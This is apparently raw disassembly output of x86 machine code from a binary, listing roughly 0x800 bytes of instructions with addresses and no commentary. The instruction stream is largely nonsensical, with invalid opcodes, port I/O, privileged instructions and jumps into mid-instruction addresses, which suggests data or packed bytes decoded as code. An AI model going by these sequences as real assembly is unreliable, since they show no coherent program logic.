  40efa3:	sar    DWORD PTR [ebx-0x6f],cl
  40efa6:	mov    ebx,DWORD PTR [edi]
  40efa8:	add    DWORD PTR [ebp-0x40e09364],esp
  40efae:	dec    edi
  40efaf:	in     al,dx
  40efb0:	in     al,dx
  40efb1:	fist   DWORD PTR [edi]
  40efb3:	fadd   DWORD PTR ds:0xf0e8a573
  40efb9:	inc    eax
  40efba:	jnp    0x40f011
  40efbc:	push   ebp
  40efbd:	sahf   
  40efbe:	or     DWORD PTR [esi-0x190240a8],ebx
  40efc4:	gs aam 0x67
  40efc7:	add    cl,BYTE PTR [edi+esi*1-0x67]
  40efcb:	enter  0xbb1f,0x9c
  40efcf:	(bad)  
  40efd0:	mov    al,ds:0x4fd2ac1b
  40efd5:	or     edi,DWORD PTR [edi+0xc9099b3]
  40efdb:	call   0xc5588313
  40efe0:	fsubr  st(5),st
  40efe2:	not    DWORD PTR [ebp+0x27]
  40efe5:	and    eax,0xb632a1ac
  40efea:	and    esp,DWORD PTR [edx-0x1e259c28]
  40eff0:	retf   0x55ab
  40eff3:	jne    0x40efc5
  40eff5:	daa    
  40eff6:	xor    edi,0x36
  40eff9:	loop   0x40f01f
  40effb:	or     esi,esi
  40effd:	daa    
  40effe:	pop    es
  40efff:	gs dec edi
  40f001:	xchg   BYTE PTR [esi],ah
  40f003:	out    dx,al
  40f004:	jle    0x40efdb
  40f006:	fistp  QWORD PTR [esi+0x1552de04]
  40f00c:	jb     0x40eff9
  40f00e:	pop    ss
  40f00f:	cwde   
  40f010:	(bad)  
  40f011:	out    dx,eax
  40f012:	mov    eax,0x377e05b6
  40f017:	push   ds
  40f018:	fldenv [eax+0x40]
  40f01b:	jb     0x40efaf
  40f01d:	neg    esi
  40f01f:	pop    ebx
  40f020:	mov    esi,DWORD PTR ds:0x84a0d39f
  40f026:	xor    DWORD PTR [ecx],ebx
  40f028:	or     bl,BYTE PTR [edi]
  40f02a:	mul    BYTE PTR [edx-0xf22bee6]
  40f030:	mov    ch,BYTE PTR [eax]
  40f032:	mov    dh,0x30
  40f034:	popf   
  40f035:	pop    ebp
  40f036:	add    edx,ebx
  40f038:	stos   DWORD PTR es:[edi],eax
  40f039:	rcr    DWORD PTR [edx*8-0xd877a29],0xb
  40f041:	enter  0x37d8,0x64
  40f045:	shl    DWORD PTR gs:[ebx+0x76fe0f31],1
  40f04c:	push   ss
  40f04d:	not    dh
  40f04f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f051:	aam    0x32
  40f053:	sbb    DWORD PTR [edx+0x4a],esi
  40f056:	xchg   ecx,eax
  40f057:	mov    eax,ds:0x326d5c5d
  40f05c:	bound  esp,QWORD PTR [ebx-0x4e01193a]
  40f062:	add    DWORD PTR [edi+0x4ded054b],edx
  40f068:	jbe    0x40f0b1
  40f06a:	sbb    BYTE PTR [esi-0x167f4051],ah
  40f070:	popf   
  40f071:	jp     0x40f01b
  40f073:	push   cs
  40f074:	scas   al,BYTE PTR es:[edi]
  40f075:	mov    gs,WORD PTR [eax]
  40f077:	bound  ebx,QWORD PTR [ebx-0x28010915]
  40f07d:	sbb    al,0x4c
  40f07f:	and    DWORD PTR ss:[esi-0x7945f86],edx
  40f086:	jmp    0x955d370a
  40f08b:	adc    esi,ebx
  40f08d:	fstp   QWORD PTR [ebp-0x46]
  40f090:	push   ss
  40f091:	push   es
  40f092:	aaa    
  40f093:	and    DWORD PTR [ebx-0x172505ab],0xffffffed
  40f09a:	add    al,0x2b
  40f09c:	pop    ecx
  40f09d:	in     al,0x48
  40f09f:	sub    BYTE PTR [eax+ebx*2+0x3404ec23],0xa2
  40f0a7:	pop    eax
  40f0a8:	icebp  
  40f0a9:	or     al,0xf0
  40f0ab:	fistp  DWORD PTR ds:0xd75c3350
  40f0b1:	jo     0x40f077
  40f0b3:	cli    
  40f0b4:	mov    eax,DWORD PTR [ebx+edx*8+0x27052813]
  40f0bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0bc:	cmp    eax,esp
  40f0be:	ficom  WORD PTR [edi]
  40f0c0:	mov    ecx,0x55d5ea1b
  40f0c5:	fsubr  st,st(1)
  40f0c7:	sub    ecx,edi
  40f0c9:	ror    DWORD PTR [esi+0x65],0xe0
  40f0cd:	jnp    0x40f050
  40f0cf:	dec    esi
  40f0d0:	cmp    BYTE PTR [esi-0x6946a6c1],bh
  40f0d6:	stc    
  40f0d7:	mov    dl,0xd6
  40f0d9:	push   ss
  40f0da:	cmp    al,cl
  40f0dc:	jae    0x40f068
  40f0de:	push   ss
  40f0df:	push   ebx
  40f0e0:	les    edi,FWORD PTR [ecx+esi*2+0x3120f689]
  40f0e7:	mov    al,ds:0x48075f53
  40f0ec:	shr    edi,0x86
  40f0ef:	call   0x5f4e:0x5f293c23
  40f0f6:	and    eax,0x793b0ad
  40f0fb:	cmp    al,0x65
  40f0fd:	out    0xb5,al
  40f0ff:	mov    bl,0xc4
  40f101:	aad    0xd1
  40f103:	adc    BYTE PTR [esi-0x5709a83],ch
  40f109:	xor    al,0xc7
  40f10b:	push   0x4e877c22
  40f110:	mov    edi,0x88349f89
  40f115:	sub    eax,0x404aa7ea
  40f11a:	push   edi
  40f11b:	out    0x6f,al
  40f11d:	or     esi,DWORD PTR [ecx-0x2bf17626]
  40f123:	aas    
  40f124:	(bad)  
  40f125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f126:	sbb    bh,al
  40f128:	popf   
  40f129:	(bad)  
  40f12a:	sub    eax,0x279afe50
  40f12f:	add    al,0x7b
  40f131:	ret    0x714f
  40f134:	sub    bh,BYTE PTR [esi+0x50]
  40f137:	cmp    eax,0xbfc4f03e
  40f13c:	add    bh,bh
  40f13e:	add    ah,ch
  40f140:	mov    ecx,0x87c13fc
  40f145:	pop    ds
  40f146:	leave  
  40f147:	fdivp  st(6),st
  40f149:	cli    
  40f14a:	mov    cl,0x40
  40f14c:	mov    DWORD PTR ds:[edx],ecx
  40f14f:	sbb    DWORD PTR [edi-0x8],edx
  40f152:	mov    eax,ds:0x762c3b83
  40f157:	frstor [edi]
  40f159:	xchg   DWORD PTR [edx-0x69d30329],esi
  40f15f:	push   edx
  40f160:	xchg   ebx,eax
  40f161:	aam    0xe3
  40f163:	mov    al,ds:0x20c1d8ab
  40f168:	into   
  40f169:	push   ss
  40f16a:	xor    eax,0x17834c8e
  40f16f:	mov    BYTE PTR ds:0x29233381,dl
  40f175:	sbb    bl,BYTE PTR [ebp-0x52]
  40f178:	into   
  40f179:	mov    eax,0xdd3c7bbf
  40f17e:	test   BYTE PTR [ecx-0x5f3cdf54],0x6f
  40f185:	or     al,BYTE PTR [edx+0x31]
  40f188:	push   edx
  40f189:	rol    DWORD PTR [ebp+0x18535bef],1
  40f18f:	sbb    DWORD PTR [eax],0xffffffd0
  40f192:	push   edi
  40f193:	jmp    0x40f139
  40f195:	cmp    ebx,DWORD PTR [edi+0x1e]
  40f198:	xchg   ecx,eax
  40f199:	(bad)  
  40f19a:	xchg   edx,eax
  40f19b:	loope  0x40f1ae
  40f19d:	xor    eax,0x27016516
  40f1a2:	std    
  40f1a3:	sbb    eax,0xa917cea0
  40f1a8:	mov    ebx,0xb2191b55
  40f1ad:	cmp    edi,DWORD PTR [eax-0x36057da4]
  40f1b3:	btc    DWORD PTR [ecx-0x4882a29e],eax
  40f1ba:	pop    ebp
  40f1bb:	or     eax,0x40295d9b
  40f1c0:	add    bh,BYTE PTR [ecx]
  40f1c2:	push   ebp
  40f1c3:	mov    bh,0x4f
  40f1c5:	jecxz  0x40f17e
  40f1c7:	into   
  40f1c8:	xchg   ebp,eax
  40f1c9:	sbb    esp,DWORD PTR [eax]
  40f1cb:	cli    
  40f1cc:	pop    ebx
  40f1cd:	jmp    0x40f1b9
  40f1cf:	cdq    
  40f1d0:	push   eax
  40f1d1:	push   ebp
  40f1d2:	pop    ds
  40f1d3:	xor    bl,BYTE PTR ds:0x1a420bc1
  40f1d9:	add    BYTE PTR [esi+0x4712f522],ch
  40f1df:	inc    ecx
  40f1e0:	dec    edx
  40f1e1:	call   0x6b23553
  40f1e6:	fiadd  DWORD PTR [esi]
  40f1e8:	sti    
  40f1e9:	pop    ecx
  40f1ea:	pop    ebp
  40f1eb:	sahf   
  40f1ec:	xchg   esp,eax
  40f1ed:	je     0x40f182
  40f1ef:	push   ecx
  40f1f0:	dec    ecx
  40f1f1:	mov    WORD PTR [edx+0xd89f21d],?
  40f1f7:	ins    BYTE PTR es:[edi],dx
  40f1f8:	xchg   esi,eax
  40f1f9:	mov    ds:0x65b7f578,al
  40f1fe:	mov    eax,esp
  40f200:	xchg   ecx,eax
  40f201:	pop    es
  40f202:	call   0x4b990b50
  40f207:	div    BYTE PTR [edx]
  40f209:	xchg   esp,eax
  40f20a:	xor    edx,DWORD PTR [edi]
  40f20c:	call   0x5eb3eaaf
  40f211:	ret    0x66b
  40f214:	pushf  
  40f215:	pop    esp
  40f216:	pop    edx
  40f217:	inc    esi
  40f218:	jle    0x40f216
  40f21a:	jns    0x40f203
  40f21c:	sbb    eax,0x7b521de2
  40f221:	leave  
  40f222:	fldl2t 
  40f224:	add    BYTE PTR [ebp+0x42],ah
  40f227:	fwait
  40f228:	test   ebp,ebp
  40f22a:	stc    
  40f22b:	daa    
  40f22c:	inc    edi
  40f22d:	dec    ebx
  40f22e:	loope  0x40f20a
  40f230:	push   ss
  40f231:	ficomp DWORD PTR ds:0xdaa62d7a
  40f237:	je     0x40f234
  40f239:	add    eax,0x1198bd95
  40f23e:	xchg   DWORD PTR [edx+ebp*2],ebp
  40f241:	aas    
  40f242:	sahf   
  40f243:	or     al,0x26
  40f245:	jo     0x40f1e7
  40f247:	xor    DWORD PTR [ebx],0xffffffb8
  40f24a:	add    DWORD PTR [ecx],0x94f23dcc
  40f250:	sbb    BYTE PTR [edi+0x3f25c6b5],0x4f
  40f257:	xor    ecx,edx
  40f259:	or     dl,BYTE PTR [ebx+0x1b540e5f]
  40f25f:	adc    eax,0x8026cf3f
  40f264:	test   edi,ebx
  40f266:	jns    0x40f25a
  40f268:	rcl    BYTE PTR [ebx-0x53],1
  40f26b:	nop
  40f26c:	neg    BYTE PTR [ecx-0x16]
  40f26f:	sub    DWORD PTR [ecx],esp
  40f271:	sbb    eax,0x977f7a38
  40f276:	and    eax,0xf4594602
  40f27b:	xor    BYTE PTR [edx+0x4bf1697f],ch
  40f281:	inc    edi
  40f282:	ins    DWORD PTR es:[edi],dx
  40f283:	jno    0x40f234
  40f285:	push   edx
  40f286:	mov    eax,fs:0x9fa39bd3
  40f28c:	add    eax,0x6f624e4e
  40f291:	mov    ecx,eax
  40f293:	cmp    bl,BYTE PTR [esi]
  40f295:	mov    esp,0x58b57571
  40f29a:	xchg   DWORD PTR [esi+0x2abaa6d9],ebp
  40f2a0:	adc    BYTE PTR [eax],ch
  40f2a2:	je     0x40f2eb
  40f2a4:	fwait
  40f2a5:	les    ebx,FWORD PTR [ebp+0x7c]
  40f2a8:	or     eax,0x94651fbf
  40f2ad:	mov    al,ds:0x9c7e581b
  40f2b2:	push   ss
  40f2b3:	mov    BYTE PTR [ebx+0x19],ah
  40f2b6:	pop    esi
  40f2b7:	inc    ebx
  40f2b8:	sar    BYTE PTR ds:0x22f667d1,1
  40f2be:	pop    ds
  40f2bf:	mov    al,ds:0x7e5038cc
  40f2c4:	stos   BYTE PTR es:[edi],al
  40f2c5:	out    0x74,al
  40f2c7:	inc    edx
  40f2c8:	push   eax
  40f2c9:	mov    ds:0xc92cff1c,eax
  40f2ce:	gs pop edx
  40f2d0:	in     eax,0xa8
  40f2d2:	dec    edx
  40f2d3:	call   0x9ea5:0x5bf02466
  40f2da:	sti    
  40f2db:	jl     0x40f268
  40f2dd:	push   cs
  40f2de:	retf   0x8a1d
  40f2e1:	sbb    ah,BYTE PTR [esi]
  40f2e3:	std    
  40f2e4:	cmp    eax,0xef991296
  40f2e9:	dec    ebx
  40f2ea:	adc    eax,DWORD PTR [edx+0x1b]
  40f2ed:	and    al,0x90
  40f2ef:	cdq    
  40f2f0:	outs   dx,BYTE PTR ds:[esi]
  40f2f1:	adc    ecx,esp
  40f2f3:	iret   
  40f2f4:	in     al,dx
  40f2f5:	jg     0x40f2f0
  40f2f7:	mov    ebp,0x2c3b7344
  40f2fc:	push   ds
  40f2fd:	adc    al,0xc5
  40f2ff:	mov    esp,0xc576e420
  40f304:	add    eax,0x66d09404
  40f309:	jp     0x40f2ce
  40f30b:	jl     0x40f38c
  40f30d:	repz sub al,0x8a
  40f310:	cmp    ebx,DWORD PTR [ebp-0x10ef1297]
  40f316:	in     eax,0x8d
  40f318:	jp     0x40f32c
  40f31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f31b:	cld    
  40f31c:	push   esp
  40f31d:	jns    0x40f37e
  40f31f:	pop    edx
  40f320:	sahf   
  40f321:	iret   
  40f322:	inc    ebp
  40f323:	push   esp
  40f324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f325:	stos   BYTE PTR es:[edi],al
  40f326:	add    BYTE PTR [eax-0x32],0xb0
  40f32a:	xor    eax,0x307a95b2
  40f32f:	cmp    BYTE PTR [edi],dl
  40f331:	push   es
  40f332:	les    edx,FWORD PTR [eax-0x161210f0]
  40f338:	fld    st(1)
  40f33a:	sbb    al,0x61
  40f33c:	and    BYTE PTR ds:0x84650147,dl
  40f342:	add    bh,BYTE PTR [ebx+0x1970835e]
  40f348:	ficom  WORD PTR [edx]
  40f34a:	jmp    0x33d4:0xa0074cb4
  40f351:	clc    
  40f352:	push   es
  40f353:	jmp    0x344132ab
  40f358:	nop
  40f359:	xor    DWORD PTR [ecx-0x41976ec4],edi
  40f35f:	jl     0x40f385
  40f361:	pop    ecx
  40f362:	fsub   QWORD PTR [ebx+0x66]
  40f365:	out    0x8e,eax
  40f367:	xor    eax,0x60876a8a
  40f36c:	xchg   ebp,eax
  40f36d:	shl    DWORD PTR [edx],1
  40f36f:	aas    
  40f370:	mov    edi,0x356e8b5a
  40f375:	jne    0x40f376
  40f377:	jle    0x40f371
  40f379:	xor    eax,0x49b9ffd5
  40f37e:	outs   dx,DWORD PTR ds:[esi]
  40f37f:	ds xchg edx,eax
  40f381:	loope  0x40f32a
  40f383:	sar    dh,cl
  40f385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f386:	call   FWORD PTR [esi]
  40f388:	mov    al,0x60
  40f38a:	jbe    0x40f385
  40f38c:	add    eax,0x87695d00
  40f391:	inc    edx
  40f392:	inc    edx
  40f393:	dec    ebp
  40f394:	hlt    
  40f395:	(bad)
  40f398:	xor    cl,ch
  40f39a:	rcr    BYTE PTR [ebx],1
  40f39c:	icebp  
  40f39d:	call   DWORD PTR [ebx]
  40f39f:	jge    0x40f331
  40f3a1:	mov    ebp,0x38bb3c10
  40f3a6:	lea    edx,[edx-0x68]
  40f3a9:	jp     0x40f394
  40f3ab:	nop
  40f3ac:	icebp  
  40f3ad:	stos   BYTE PTR es:[edi],al
  40f3ae:	call   0xb33791bd
  40f3b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3b4:	in     eax,dx
  40f3b5:	in     al,dx
  40f3b6:	jmp    0x7a91438c
  40f3bb:	je     0x40f415
  40f3bd:	mov    bl,BYTE PTR [edx+0x1c]
  40f3c0:	in     al,dx
  40f3c1:	jl     0x40f422
  40f3c3:	push   edi
  40f3c4:	aaa    
  40f3c5:	sti    
  40f3c6:	pop    ds
  40f3c7:	fadd   QWORD PTR [ecx]
  40f3c9:	sub    al,0x4f
  40f3cb:	fst    QWORD PTR [eax]
  40f3cd:	dec    ecx
  40f3ce:	and    bl,BYTE PTR [ecx+0x3c]
  40f3d1:	call   0xd181:0x5020292f
  40f3d8:	in     eax,0xb5
  40f3da:	xor    eax,0x299a0380
  40f3df:	jl     0x40f3dd
  40f3e1:	xchg   ebp,eax
  40f3e2:	retf   
  40f3e3:	cmp    al,0x51
  40f3e5:	popf   
  40f3e6:	and    edx,esp
  40f3e8:	cmp    eax,0x91079691
  40f3ed:	push   eax
  40f3ee:	and    eax,DWORD PTR [edi-0x63]
  40f3f1:	dec    ecx
  40f3f2:	mov    ds:0xab04098b,eax
  40f3f7:	gs xor eax,0xaf162145
  40f3fd:	add    al,0x61
  40f3ff:	mov    edi,0xc3dea96
  40f404:	and    al,0xf3
  40f406:	js     0x40f3f7
  40f408:	push   esp
  40f409:	jecxz  0x40f3c0
  40f40b:	out    dx,al
  40f40c:	cmp    eax,0x130522fa
  40f411:	rol    BYTE PTR [ecx+0x3e],1
  40f414:	fadd   DWORD PTR ds:0x379fabf9
  40f41a:	stos   BYTE PTR es:[edi],al
  40f41b:	pop    esp
  40f41c:	adc    BYTE PTR [edi-0x63f6f4fe],ch
  40f422:	ins    DWORD PTR es:[edi],dx
  40f423:	nop
  40f424:	or     ecx,0x87935b0a
  40f42a:	call   DWORD PTR [edx+0x70693dbe]
  40f430:	add    BYTE PTR [esi],cl
  40f432:	es lahf 
  40f434:	mov    eax,0xc06db94e
  40f439:	adc    BYTE PTR [edi-0xd369da4],bl
  40f43f:	cmp    ch,bl
  40f441:	retf   0xbb38
  40f444:	sbb    ebx,DWORD PTR [edx+ebp*1+0x70]
  40f448:	out    dx,eax
  40f449:	leave  
  40f44a:	and    DWORD PTR [esi+0x33],0x4ed02ce7
  40f451:	cmc    
  40f452:	repz pop ebx
  40f454:	gs mov eax,0x2591a658
  40f45a:	div    bl
  40f45c:	fsubrp st(1),st
  40f45e:	cmp    DWORD PTR [esp+edx*4],0xa2fa6caa
  40f465:	inc    ebp
  40f466:	mov    al,ds:0xd8edde8
  40f46b:	inc    ecx
  40f46c:	test   edi,ebx
  40f46e:	stos   DWORD PTR es:[edi],eax
  40f46f:	push   cs
  40f470:	arpl   WORD PTR [ebp+ecx*8-0x75a114f4],dx
  40f477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f478:	in     eax,dx
  40f479:	jmp    0x3281d85d
  40f47e:	sub    ch,bl
  40f480:	div    dh
  40f482:	fist   DWORD PTR [esi+edx*2+0x2bb468ef]
  40f489:	sbb    eax,DWORD PTR [ebx-0x5b]
  40f48c:	stos   BYTE PTR es:[edi],al
  40f48d:	dec    ecx
  40f48e:	adc    BYTE PTR [edx+ebx*1-0x38],cl
  40f492:	mov    BYTE PTR [esp+edx*8-0x54],ah
  40f496:	pop    ecx
  40f497:	cs dec ebp
  40f499:	add    eax,0x579c823f
  40f49e:	xchg   ebx,eax
  40f49f:	and    eax,0x3f382a9a
  40f4a4:	scas   al,BYTE PTR es:[edi]
  40f4a5:	jmp    0x21aafe9f
  40f4aa:	xor    eax,0x45526b5
  40f4af:	pusha  
  40f4b0:	xchg   ecx,eax
  40f4b1:	imul   edx,DWORD PTR [edi-0x49],0x113e68d8
  40f4b8:	sub    cl,dh
  40f4ba:	fimul  WORD PTR [ecx+esi*2-0x78]
  40f4be:	test   al,0xa2
  40f4c0:	push   ds
  40f4c1:	ficomp DWORD PTR [edi+0x52]
  40f4c4:	ds jecxz 0x40f47b
  40f4c7:	mov    bh,0x0
  40f4c9:	jmp    0x6a08fb65
  40f4ce:	imul   edi,DWORD PTR [ecx],0x48
  40f4d1:	lods   al,BYTE PTR ds:[esi]
  40f4d2:	je     0x40f500
  40f4d4:	aaa    
  40f4d5:	cdq    
  40f4d6:	enter  0xb83a,0x97
  40f4da:	sub    eax,0x3818330a
  40f4df:	dec    ebx
  40f4e0:	pop    es
  40f4e1:	stc    
  40f4e2:	xchg   esp,eax
  40f4e3:	pop    eax
  40f4e4:	arpl   WORD PTR [ebp+0x6f],bp
  40f4e7:	push   cs
  40f4e8:	dec    esp
  40f4e9:	or     al,0x30
  40f4eb:	icebp  
  40f4ec:	das    
  40f4ed:	xchg   esi,eax
  40f4ee:	xchg   ecx,eax
  40f4ef:	mov    al,0x20
  40f4f1:	mov    dh,0x47
  40f4f3:	jb     0x40f548
  40f4f5:	jecxz  0x40f537
  40f4f7:	jle    0x40f51e
  40f4f9:	(bad)  
  40f4fa:	in     eax,dx
  40f4fb:	enter  0x60da,0x71
  40f4ff:	(bad)  
  40f500:	xor    DWORD PTR [esp+eiz*2+0x2f],esp
  40f504:	dec    ebp
  40f505:	(bad)  
  40f506:	test   DWORD PTR [edi+0xe],ebp
  40f509:	aad    0xa8
  40f50b:	sbb    DWORD PTR [eax],edx
  40f50d:	ins    BYTE PTR es:[edi],dx
  40f50e:	mov    cs,WORD PTR [edi+0x55]
  40f511:	ins    DWORD PTR es:[edi],dx
  40f512:	faddp  st(6),st
  40f514:	sti    
  40f515:	lahf   
  40f516:	and    dh,BYTE PTR [eax]
  40f518:	mov    bl,0x24
  40f51a:	test   DWORD PTR [eax+0x789abb5f],ecx
  40f520:	imul   edi,DWORD PTR [edi-0x324d6da2],0xffffffc0
  40f527:	pop    ecx
  40f528:	xchg   ebp,eax
  40f529:	dec    ecx
  40f52a:	jle    0x40f4f8
  40f52c:	into   
  40f52d:	push   edx
  40f52e:	fisubr DWORD PTR [edi-0x3c]
  40f531:	scas   eax,DWORD PTR es:[edi]
  40f532:	mov    bh,0x5
  40f534:	pop    es
  40f535:	rol    cl,1
  40f537:	test   al,ch
  40f539:	inc    ecx
  40f53a:	mov    ch,0x96
  40f53c:	jmp    0x7e42d9a7
  40f541:	addr16 fdivr st,st(3)
  40f544:	ror    BYTE PTR [ebx+0x1b],0xed
  40f548:	jnp    0x40f570
  40f54a:	push   0xfffffffa
  40f54c:	int3   
  40f54d:	shl    BYTE PTR [edx-0x14],0x66
  40f551:	scas   al,BYTE PTR es:[edi]
  40f552:	mov    fs,ecx
  40f554:	jbe    0x40f54f
  40f556:	rcl    BYTE PTR [eax],0xa6
  40f559:	enter  0xbcbb,0x55
  40f55d:	sbb    esp,ebx
  40f55f:	rcl    bh,cl
  40f561:	scas   al,BYTE PTR es:[edi]
  40f562:	dec    ecx
  40f563:	sub    esp,ebx
  40f565:	je     0x40f590
  40f567:	in     al,dx
  40f568:	pop    esi
  40f569:	jbe    0x40f5aa
  40f56b:	ins    BYTE PTR es:[edi],dx
  40f56c:	adc    eax,0x5fe1b4c3
  40f571:	add    BYTE PTR [edx-0x50],bh
  40f574:	arpl   WORD PTR [ecx],bp
  40f576:	add    DWORD PTR [eax-0x41b5fb3],edx
  40f57c:	cmp    al,0xd6
  40f57e:	pop    esi
  40f57f:	mov    dl,0xfe
  40f581:	dec    edx
  40f582:	cmp    bl,ch
  40f584:	adc    al,BYTE PTR [esi+ebp*8-0x45]
  40f588:	outs   dx,BYTE PTR ds:[esi]
  40f589:	xchg   ebx,eax
  40f58a:	jns    0x40f577
  40f58c:	jmp    0xcb5cbf2d
  40f591:	mov    ?,WORD PTR [ecx+edi*1]
  40f594:	pop    ebp
  40f595:	mov    eax,ds:0x90f959af
  40f59a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f59b:	or     al,0xf
  40f59d:	cmp    al,ch
  40f59f:	xor    BYTE PTR [ecx],cl
  40f5a1:	inc    esp
  40f5a2:	jnp    0x40f56a
  40f5a4:	jns    0x40f5bb
  40f5a6:	mov    ch,0x5f
  40f5a8:	lock fistp QWORD PTR [edx]
  40f5ab:	jnp    0x40f608
  40f5ad:	push   edx
  40f5ae:	cld    
  40f5af:	xor    BYTE PTR [edx-0x93226bc],0x4b
  40f5b6:	jg     0x40f60f
  40f5b8:	add    esp,edx
  40f5ba:	ins    DWORD PTR es:[edi],dx
  40f5bb:	test   al,0xaa
  40f5bd:	and    ebp,DWORD PTR [ebx]
  40f5bf:	or     eax,0xe9a67841
  40f5c4:	mov    esp,0xc3609050
  40f5c9:	cld    
  40f5ca:	fs mov ah,0xfb
  40f5cd:	mov    WORD PTR [edi+edi*1+0x73],es
  40f5d1:	xchg   ebx,eax
  40f5d2:	repnz xchg esi,eax
  40f5d4:	sub    eax,0x91cf7b9e
  40f5d9:	cmc    
  40f5da:	push   cs
  40f5db:	and    DWORD PTR [ebp+0x35],ebp
  40f5de:	jmp    0x40f5cd
  40f5e0:	pop    eax
  40f5e1:	cmp    BYTE PTR [esi-0x5f],bh
  40f5e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5e5:	mov    esp,0x73f328f4
  40f5ea:	cmp    eax,DWORD PTR [esi]
  40f5ec:	sbb    ecx,DWORD PTR [ebp-0x49]
  40f5ef:	fs aam 0xd2
  40f5f2:	cwde   
  40f5f3:	sbb    edx,DWORD PTR [esi+0xf]
  40f5f6:	pop    ds
  40f5f7:	pusha  
  40f5f8:	ins    DWORD PTR es:[edi],dx
  40f5f9:	(bad)  
  40f5fa:	pop    ecx
  40f5fb:	fldpi  
  40f5fd:	inc    eax
  40f5fe:	sub    ecx,DWORD PTR ds:0x8c179655
  40f604:	arpl   WORD PTR [esi-0x169a499b],cx
  40f60a:	dec    esp
  40f60b:	js     0x40f5c6
  40f60d:	jg     0x40f67e
  40f60f:	sub    al,0xef
  40f611:	sub    esp,edi
  40f613:	les    edx,FWORD PTR [edi]
  40f615:	mov    al,0x57
  40f617:	jl     0x40f645
  40f619:	cld    
  40f61a:	fldenv [ebp-0x245f34d7]
  40f620:	and    BYTE PTR [esi-0x22],bh
  40f623:	gs push es
  40f625:	jbe    0x40f5f4
  40f627:	mov    esp,0x109295cd
  40f62c:	sub    al,0xcc
  40f62e:	dec    ebp
  40f62f:	pop    edi
  40f630:	jg     0x40f682
  40f632:	sahf   
  40f633:	test   BYTE PTR [edx+0x7d08c180],al
  40f639:	mov    BYTE PTR [ebp-0xf],al
  40f63c:	push   ebx
  40f63d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f63e:	nop
  40f63f:	stc    
  40f640:	pop    esp
  40f641:	jl     0x40f5ee
  40f643:	push   esi
  40f644:	mov    ds:0xb8c77cce,al
  40f649:	bound  ecx,QWORD PTR [eax]
  40f64b:	loopne 0x40f68d
  40f64d:	pop    eax
  40f64e:	sbb    al,0x85
  40f650:	clc    
  40f651:	jl     0x40f615
  40f653:	and    edx,DWORD PTR [ebx-0x68]
  40f656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f657:	mov    WORD PTR [ebp-0x6a],ss
  40f65a:	dec    ebp
  40f65b:	xor    eax,0xc65ce24d
  40f660:	sar    DWORD PTR [edi+0x38c26248],1
  40f666:	or     al,0xbc
  40f668:	jnp    0x40f690
  40f66a:	sbb    esi,DWORD PTR [edx+0x1f]
  40f66d:	pushf  
  40f66e:	push   esi
  40f66f:	imul   esp,DWORD PTR [edx-0x5c32dda4],0xc1240a94
  40f679:	mov    ds:0x51114607,al
  40f67e:	pop    eax
  40f67f:	lods   eax,DWORD PTR ds:[esi]
  40f680:	idiv   BYTE PTR [ebx-0x2]
  40f683:	or     DWORD PTR [edx*8-0x13f4158a],ecx
  40f68a:	mov    esp,0x1cd541dc
  40f68f:	dec    esi
  40f690:	cmp    al,BYTE PTR [ebx]
  40f692:	adc    eax,0x2e4c61c2
  40f697:	dec    eax
  40f698:	test   DWORD PTR [ecx-0x37],ebp
  40f69b:	scas   al,BYTE PTR es:[edi]
  40f69c:	push   ebp
  40f69d:	cmp    dh,al
  40f69f:	cwde   
  40f6a0:	push   ecx
  40f6a1:	cs mov edi,0xd5bc613d
  40f6a7:	fwait
  40f6a8:	or     ecx,DWORD PTR [ebx-0x4f678322]
  40f6ae:	push   esp
  40f6af:	cli    
  40f6b0:	push   es
  40f6b1:	mov    dl,BYTE PTR [edi-0x8]
  40f6b4:	(bad)  
  40f6b5:	rol    DWORD PTR [edx+0x70d41b7],0x5d
  40f6bc:	mov    ds:0x1bcfd1b7,al
  40f6c1:	sub    eax,0x90370135
  40f6c6:	pop    ebx
  40f6c7:	je     0x40f6c7
  40f6c9:	push   esi
  40f6ca:	int    0x53
  40f6cc:	(bad)  
  40f6cd:	jecxz  0x40f6d7
  40f6cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6d0:	and    BYTE PTR [edx+0x3],ch
  40f6d3:	nop
  40f6d4:	sbb    BYTE PTR [ecx],0xd7
  40f6d7:	ret    
  40f6d8:	ror    DWORD PTR [ebx+0x6197e642],cl
  40f6de:	inc    esi
  40f6df:	xchg   ebp,eax
  40f6e0:	gs mov eax,0x86042e2b
  40f6e6:	jle    0x40f72d
  40f6e8:	fsub   QWORD PTR [edx]
  40f6ea:	lods   al,BYTE PTR ds:[esi]
  40f6eb:	lahf   
  40f6ec:	add    al,0xa7
  40f6ee:	je     0x40f6da
  40f6f0:	xchg   esp,eax
  40f6f1:	imul   ebx,DWORD PTR [eax+0x3466380f],0xc12e091f
  40f6fb:	test   eax,0x44f80c2d
  40f700:	pusha  
  40f701:	sbb    al,0xc4
  40f703:	fdiv   DWORD PTR [ebx+0x1e]
  40f706:	sub    eax,0x7cc46793
  40f70b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f70c:	xor    eax,0xf31acad
  40f712:	ret    0x4e5f
  40f715:	xor    al,0xfe
  40f717:	xchg   esp,eax
  40f718:	fucomi st,st(5)
  40f71a:	pop    ds
  40f71b:	repz and BYTE PTR [edx+0x6bb83f68],dl
  40f722:	sbb    dh,ah
  40f724:	arpl   bp,si
  40f726:	adc    DWORD PTR [edx+0x7b],0x4a
  40f72a:	and    al,0x97
  40f72c:	in     eax,dx
  40f72d:	mul    esi
  40f72f:	cmp    al,0xbd
  40f731:	push   edx
  40f732:	pop    ebp
  40f733:	dec    ebp
  40f734:	cdq    
  40f735:	xor    DWORD PTR [esi-0x26],0x7f1158b9
  40f73c:	xchg   edx,eax
